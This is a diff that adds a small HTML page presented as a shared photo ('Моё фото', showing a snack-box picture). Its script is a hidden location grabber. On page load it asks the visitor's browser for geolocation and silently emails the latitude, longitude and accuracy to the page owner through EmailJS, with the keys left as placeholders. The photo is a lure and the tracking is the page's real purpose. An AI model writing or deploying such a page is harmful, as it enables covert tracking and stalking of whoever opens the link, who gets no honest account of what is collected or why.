@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Фото</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body { text-align: center; font-family: sans-serif; }
+    img { width: 90%; max-width: 500px; margin-top: 30px; }
+  </style>
+</head>
+<body>
+ <img src="https://www.chinesefoodwiki.org/images/5/52/Chinese_Snack_Box.png"  alt="Моё фото">
+
+  <script>
+    emailjs.init("YOUR_PUBLIC_KEY");
+
+    function sendLocation(lat, lon, accuracy) {
+      emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+        latitude: lat,
+        longitude: lon,
+        accuracy: accuracy
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = position.coords.accuracy;
+        sendLocation(lat, lon, acc);
+      });
+    }
+  </script>
+</body>
+</html>
